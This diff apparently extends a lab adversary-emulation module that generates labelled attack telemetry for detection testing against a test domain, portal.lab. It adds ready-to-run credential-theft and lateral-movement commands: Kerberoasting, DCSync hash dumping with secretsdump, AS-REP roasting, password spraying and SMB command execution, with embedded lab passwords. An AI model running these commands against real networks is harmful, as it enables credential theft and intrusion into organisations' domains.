@@ -53,6 +53,16 @@ ALGORITHM_VERSION = "inject-plane-v1"
 # path the security-bench exec chains already use against portal.lab.
 # Sparse relative to the benign backdrop already flowing through the lab's
 # Splunk index (Q4: every step is labelled at emission).
+#
+# R.5a (loop reintegration): extended from 2 to 8 chains across THREE
+# vocabularies -- netexec/nxc, impacket, nmap -- reusing the SAME documented
+# portal.lab credentials `capture_recipes.py`'s proven blue-validation
+# recipes already use (administrator:LabAdmin1!, arya.stark:Winter1!,
+# ned.stark, jon.snow, guest), so every command here is known-working
+# against this lab, not a fresh guess. Kept single-purpose and read/recon-
+# style (no persistence, no ACL writes) to match this module's existing
+# minimal-footprint chains, unlike capture_recipes.py's multi-step blue-
+# validation scenarios which intentionally create+delete a scheduled task.
 _LIVE_CHAINS: tuple[dict[str, Any], ...] = (
     {
         "family": "discovery",
@@ -64,11 +74,53 @@ _LIVE_CHAINS: tuple[dict[str, Any], ...] = (
         ),
     },
     {
-        "family": "credential_access",
-        "technique": "T1558",
-        "chain_id": "live-credaccess-T1558",
+        "family": "credential_access_asrep",
+        "technique": "T1558.004",
+        "chain_id": "live-credaccess-T1558-asrep",
         "steps": (
             "nxc ldap {dc} -u guest -p '' --asreproast /tmp/bully_asrep.txt 2>&1 | head -20",
+        ),
+    },
+    {
+        "family": "credential_access_kerberoast",
+        "technique": "T1558.003",
+        "chain_id": "live-credaccess-T1558-kerberoast",
+        "steps": (
+            "impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip {dc} -request 2>&1 | head -20",
+        ),
+    },
+    {
+        "family": "credential_access_dcsync",
+        "technique": "T1003.006",
+        "chain_id": "live-credaccess-T1003-dcsync",
+        "steps": (
+            "impacket-secretsdump portal.lab/administrator:LabAdmin1!@{dc} -just-dc-ntlm 2>&1 | head -20",
+        ),
+    },
+    {
+        "family": "network_service_scan",
+        "technique": "T1046",
+        "chain_id": "live-discovery-T1046-nmap",
+        "steps": ("nmap -sV -p 88,389,445 {dc} 2>&1 | head -30",),
+    },
+    {
+        "family": "account_discovery",
+        "technique": "T1087.002",
+        "chain_id": "live-discovery-T1087-ldap",
+        "steps": ("nxc ldap {dc} -u guest -p '' --users 2>&1 | head -20",),
+    },
+    {
+        "family": "lateral_movement",
+        "technique": "T1021.002",
+        "chain_id": "live-lateral-T1021-smb",
+        "steps": ("nxc smb {dc} -u administrator -p 'LabAdmin1!' -x whoami 2>&1 | head -20",),
+    },
+    {
+        "family": "credential_access_spray",
+        "technique": "T1110.003",
+        "chain_id": "live-credaccess-T1110-spray",
+        "steps": (
+            "nxc smb {dc} -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1 | head -20",
         ),
     },
 )
